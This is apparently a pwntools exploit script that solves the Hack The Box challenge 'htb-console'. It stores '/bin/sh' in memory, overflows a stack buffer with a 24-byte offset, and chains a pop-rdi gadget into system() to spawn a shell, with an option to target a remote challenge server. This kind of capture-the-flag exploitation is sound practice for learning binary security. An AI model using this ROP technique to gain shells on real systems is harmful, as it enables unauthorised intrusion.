from pwn import *

gs = '''
    b* 0x0000000000401473

    continue
'''

elf = context.binary = ELF('./htb-console')
context.terminal = ['gnome-terminal', '-e']
libc = elf.libc

def start():
    if args.GDB:
        return gdb.debug('./htb-console', gdbscript=gs)
    if args.REMOTE:
        return remote('94.237.54.176', 37167)
    else:
        return process('./htb-console')


io = start()

offset = 24

pop_rdi = 0x0000000000401473
ret = 0x000000000040101a

#print(elf.got)
#print(elf.plt)
#print(elf.sym)

hof_bin_sh = 0x4040b0

payload = b"".join(
    [
        b"A"*offset,
        p64(pop_rdi),
        p64(hof_bin_sh),
        p64(0x401381) # objdump -D htb-console | grep "system"
    ]
)

io.sendlineafter(">> ", b"hof")
io.sendlineafter(": ", b"/bin/sh")
io.sendlineafter(">> ", b"flag")
io.sendlineafter("flag: ", payload)

io.interactive()

